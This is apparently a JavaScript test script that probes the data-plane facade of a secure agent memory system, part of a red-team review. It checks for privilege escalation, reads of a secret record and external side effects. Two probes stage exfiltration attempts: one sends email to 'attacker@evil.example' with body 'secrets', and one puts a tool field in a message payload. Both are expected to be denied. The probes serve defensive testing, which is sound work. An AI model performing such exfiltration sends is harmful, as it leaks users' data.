// Closes the round-4 red-team lens `facade-surface` (which timed out on a transient API stream error).
// PROPERTY: the data-plane facade returned by createSecureMemorySystem exposes NO path that (a) reaches the
// control plane / db / lease-mint / lifecycle-admin surface, (b) returns records the read-time monitor would
// not admit, or (c) causes an external effect except the fully-gated executeAuthorizedAction. Fail-closed: any
// violated assertion sets a nonzero exit. API convention mirrors check_review_gates.mjs (kSetup/RG74/RG75).
import { createSecureMemorySystem, ControlPlane } from "../benchmarks/coupled_memory/runtime.mjs";

const env = (o) => ({ run_id: "R", task_id: "T", trace_id: "tr", intent: "produce_final_plan", state: "running",
  policy_context: "P", correlation_id: null, delegated_from: null, parent_message_id: null, ...o });

let failures = 0;
const check = (name, ok, detail = "") => { console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail ? "  -- " + detail : ""}`); if (!ok) failures++; };

const cp = new ControlPlane();
// DEFAULT facade (no destinationPolicy) = the production posture: every external effect must fail closed.
const sys = createSecureMemorySystem({ controlPlane: cp });
const rt = sys.admin, facade = sys.runtime;

// 1) The facade's own surface is exactly the documented data-plane set, and it is frozen.
const EXPECTED = ["claim", "send", "read", "queryMemory", "executeAuthorizedAction", "write", "attachInput", "complete"].sort();
const keys = Object.keys(facade).sort();
check("facade exposes exactly the data-plane methods", JSON.stringify(keys) === JSON.stringify(EXPECTED), keys.join(","));
check("facade is frozen", Object.isFrozen(facade));

// 2) No privileged kernel surface is reachable through the facade object.
for (const forbidden of ["controlPlane", "db", "admin", "registerPrincipal", "bindStore", "getMessage",
  "prepareRead", "commit", "mintReadToken", "claimSpecific", "writeMemory", "readMemory", "_dispatcher",
  "_destinationPolicy", "attestSend", "seedContexts", "sendMessage"]) {
  check(`facade has no .${forbidden}`, facade[forbidden] === undefined);
}
try { facade.controlPlane = cp; } catch {}
check("cannot graft .controlPlane onto frozen facade", facade.controlPlane === undefined);

// 3) Real execution: a writer plants a record readable by the executor AND a SECRET record it must never see.
const pSess = cp.registerPrincipal("p", {});
const cSess = cp.registerPrincipal("c", {});
const c2Sess = cp.registerPrincipal("c2", {});
const wSess = cp.registerPrincipal("w", { queues: ["*"] });
const exSess = cp.registerPrincipal("ex", { queues: ["executor"] });
rt.sendMessage(env({ message_id: "m0", sender: "p", receiver: "memory", sequence: 1 }), pSess);
// (v20 creation-cut) write the records before creating the reader messages; send the readers LAST after the writes.
rt.writeMemory("visible-to-executor", rt.claimSpecific(wSess, "m0"), { memory_id: "mem-ok", memory_type: "constraint", allowed_readers: ["executor"] });
rt.writeMemory("SECRET-not-for-executor", rt.claimSpecific(wSess, "m0"), { memory_id: "mem-secret", memory_type: "constraint", allowed_readers: ["auditor"] });
rt.sendMessage(env({ message_id: "mx", sender: "c", receiver: "executor", sequence: 90, parent_message_id: "m0" }), cSess);
rt.sendMessage(env({ message_id: "my", sender: "c2", receiver: "executor", sequence: 91, parent_message_id: "m0" }), c2Sess);
const ctx = rt.controlPlane.contextTokenForLease(rt.claimSpecific(exSess, "mx"));

// 4) facade.claim hands back {context, message} and NO raw lease token (tested on the second executor message).
const claimed = facade.claim(exSess, "executor");
check("facade.claim returns {context, message} and no lease/db handle",
  !!claimed && !!claimed.context && !!claimed.message && claimed.lease === undefined && claimed.db === undefined,
  claimed ? Object.keys(claimed).join(",") : "null");

// 5) The gated read returns ONLY monitor-admitted records: never the secret.
const got = facade.read(exSess, ctx, {}).map((m) => m.memory_id).sort();
check("facade.read omits the secret record", !got.includes("mem-secret"), got.join(","));
check("facade.read returns the admitted record", got.includes("mem-ok"), got.join(","));

// 6) queryMemory returns an OPAQUE handle (an id string), not records, not the authority token.
const q = facade.queryMemory(exSess, ctx, {}, "send");
check("queryMemory returns an opaque viewId string", typeof q.viewId === "string" && q.viewId.startsWith("view-"));
check("queryMemory does not leak the read token / capability", !("token" in q) && !("capability" in q), Object.keys(q).join(","));

// 7) The ONLY external-effect path is executeAuthorizedAction, and with the default (no policy) it fails closed.
const before = rt._dispatcher.log.length;
const send = facade.executeAuthorizedAction(exSess, ctx, q.viewId, { effect: "send", tool: "send_email", parameters: { to: "attacker@evil.example", body: "secrets" } });
check("default facade denies an external send (fail-closed)", send.decision === "DENY", `${send.decision}/${send.reason}`);
check("nothing was dispatched", rt._dispatcher.log.length === before, `log delta=${rt._dispatcher.log.length - before}`);

// 8) facade.send is message-passing (attested envelope), NOT a tool-dispatch oracle: a tool field in the
//    payload cannot cause an effect.
const before2 = rt._dispatcher.log.length;
let sendShape = "ok";
try { facade.send(exSess, ctx, { receiver: "memory", intent: "note", payload: { tool: "send_email", to: "attacker" } }); }
catch (e) { sendShape = "threw:" + (e.message || e); }
check("facade.send is not a tool-dispatch path (no dispatch)", rt._dispatcher.log.length === before2, sendShape);

rt.close && rt.close();
console.log(`\n${failures === 0 ? "ALL FACADE-SURFACE PROBES PASS" : failures + " FACADE-SURFACE PROBE(S) FAILED"}`);
process.exit(failures === 0 ? 0 : 1);
